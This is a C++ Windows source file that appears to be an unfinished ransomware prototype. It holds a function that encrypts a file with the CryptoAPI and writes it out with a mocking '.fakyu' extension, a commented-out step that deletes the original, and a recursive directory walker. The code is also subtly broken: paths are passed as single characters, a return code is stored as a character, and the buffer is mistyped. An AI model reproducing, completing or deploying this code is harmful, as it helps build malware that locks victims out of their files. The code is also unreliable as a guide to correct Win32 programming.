#include <Windows.h>
#include <iostream>
#include <fstream>
#include "strsafe.h"
#include <wchar.h>



int encryptFile(WCHAR srcFile, HCRYPTKEY clé, HCRYPTPROV context){


	WCHAR pzDestFile = wcscat_s(&srcFile,MAX_PATH,L".fakyu");

	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestFile = INVALID_HANDLE_VALUE;


	DWORD eof = 0;
	PBYTE pbBuffer[120];
	DWORD dwBlockLen = 960;
	DWORD dwBufferLen = 960;
	DWORD dwCount = 0;


	hSourceFile = CreateFileW(&srcFile, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile != INVALID_HANDLE_VALUE) {

		std::cout << "The sourcefile is open" << std::endl;
	}
	else {
		DWORD d = GetLastError();
		std::cout << "Error opening handle to the sourcefile, error code: " << d << std::endl;
		return -1;

	}

	hDestFile = CreateFileW(&pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hDestFile) {

		std::cout << "The destfile is open" << std::endl;
	}
	else {
		DWORD d = GetLastError();
		std::cout << "Error opening handle to the destfile, error code 0x8" << d << std::endl;
		return -1;

	}

	while (eof == 0) {

		if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
			break;

		}

		std::cout << dwCount << std::endl;
		if (dwCount < dwBlockLen) {

			eof = 1;
		}

		if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error encrypting the buffer, error code 0x8" << d << std::endl;
			break;

		}

		if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
			break;


		}

		/*if (DeleteFile(&srcFile) == 0) {
			DWORD d = GetLastError();
			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
			break;

		}*/


	}

	return 0;
}

bool traverse(LPCWSTR targetDir, int nLevel = 0) {

	WIN32_FIND_DATA file_data;
	WCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;

	StringCchCopyW(szDir, MAX_PATH, targetDir);
	StringCchCatW(szDir, MAX_PATH, L"\\*");

	// finds the first file

	hFind = FindFirstFile(szDir, &file_data);
	if (hFind == INVALID_HANDLE_VALUE) {
		std::cout << "FindFirstFile failed, with errorcode : " << GetLastError() << std::endl;
		return false;
	}

	// lists the actual files recursively

	wchar_t szOutLine[MAX_PATH] = { 0 };
	for (int ii = 0; ii < nLevel; ++ii)
		szOutLine[ii] = L'\t';


	do {
		if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			if (L'.' != file_data.cFileName[0]) {

				printf("  %ws%ws   <DIR>\n", szOutLine, file_data.cFileName);
				StringCchCopyW(szDir + wcslen(targetDir) + 1, MAX_PATH, file_data.cFileName);
				traverse(szDir, nLevel + 1);

			}
		}
		else {
			printf("%ws%ws\n", szOutLine, file_data.cFileName);
		}
	} while (FindNextFile(hFind, &file_data) != 0);

	FindClose(hFind);
	return true;


}